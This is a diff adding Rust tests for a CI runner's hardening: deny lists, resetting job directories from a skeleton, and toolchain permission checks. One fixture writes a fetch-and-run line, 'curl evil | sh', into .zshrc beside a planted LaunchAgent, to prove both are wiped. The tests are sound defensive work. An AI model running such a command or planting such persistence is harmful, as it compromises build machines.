@@ -302,3 +302,73 @@ fn runner_tree_must_match_the_pinned_manifest_before_every_launch() {
     // Another owner (root in production) is refused.
     assert!(verify_runner_tree(&dir, &manifest, &pin, Some(uid.wrapping_add(1))).is_err());
 }
+
+#[test]
+fn scheduler_deny_lists_must_name_the_runner_account_exactly() {
+    assert!(denies_user("root\ncarrick-ci\n", "carrick-ci"));
+    assert!(denies_user("  carrick-ci  \n", "carrick-ci"));
+    assert!(!denies_user(
+        "carrick-ci-other\n# carrick-ci\n",
+        "carrick-ci"
+    ));
+    assert!(!denies_user("", "carrick-ci"));
+}
+
+#[test]
+fn job_home_and_work_are_recreated_from_the_skeleton_before_every_job() {
+    let root = tempfile::tempdir().unwrap();
+    let uid = unsafe { libc::geteuid() };
+    let gid = unsafe { libc::getegid() };
+    let skel = root.path().join("skel");
+    std::fs::create_dir_all(skel.join(".config")).unwrap();
+    std::fs::write(skel.join(".zshrc"), "export SKEL=1\n").unwrap();
+    std::fs::write(skel.join(".config/git"), "[core]\n").unwrap();
+    std::fs::set_permissions(&skel, std::fs::Permissions::from_mode(0o755)).unwrap();
+    let home = root.path().join("home");
+    let work = root.path().join("_work");
+    let diag = root.path().join("_diag");
+    // A previous job left persistence and caches behind.
+    std::fs::create_dir_all(home.join("Library/LaunchAgents")).unwrap();
+    std::fs::write(home.join("Library/LaunchAgents/evil.plist"), "x").unwrap();
+    std::fs::write(home.join(".zshrc"), "curl evil | sh\n").unwrap();
+    std::fs::create_dir_all(work.join("old/target")).unwrap();
+    std::fs::write(work.join("old/target/cache"), "x").unwrap();
+    // A symlink planted in place of a work dir is removed, never followed.
+    let outside = root.path().join("outside");
+    std::fs::create_dir(&outside).unwrap();
+    std::fs::write(outside.join("keep"), "x").unwrap();
+    std::os::unix::fs::symlink(&outside, &diag).unwrap();
+    reset_job_area(&skel, &home, &[work.clone(), diag.clone()], uid, uid, gid).unwrap();
+    assert_eq!(
+        std::fs::read_to_string(home.join(".zshrc")).unwrap(),
+        "export SKEL=1\n"
+    );
+    assert!(home.join(".config/git").is_file());
+    assert!(!home.join("Library").exists());
+    assert_eq!(std::fs::read_dir(&work).unwrap().count(), 0);
+    assert!(std::fs::symlink_metadata(&diag).unwrap().is_dir());
+    assert!(outside.join("keep").exists(), "symlink target untouched");
+    // A skeleton the runner account could write is refused.
+    std::fs::set_permissions(&skel, std::fs::Permissions::from_mode(0o777)).unwrap();
+    assert!(reset_job_area(&skel, &home, &[], uid, uid, gid).is_err());
+}
+
+#[test]
+fn toolchain_must_be_owner_only() {
+    let root = tempfile::tempdir().unwrap();
+    let uid = unsafe { libc::geteuid() };
+    let tool = root.path().join("toolchain");
+    std::fs::create_dir_all(tool.join("rustup")).unwrap();
+    std::fs::create_dir_all(tool.join("cargo/bin")).unwrap();
+    for dir in [tool.clone(), tool.join("rustup"), tool.join("cargo/bin")] {
+        std::fs::set_permissions(&dir, std::fs::Permissions::from_mode(0o755)).unwrap();
+    }
+    verify_toolchain(&tool, uid).unwrap();
+    assert!(verify_toolchain(&tool, uid.wrapping_add(1)).is_err());
+    std::fs::set_permissions(
+        tool.join("cargo/bin"),
+        std::fs::Permissions::from_mode(0o777),
+    )
+    .unwrap();
+    assert!(verify_toolchain(&tool, uid).is_err());
+}
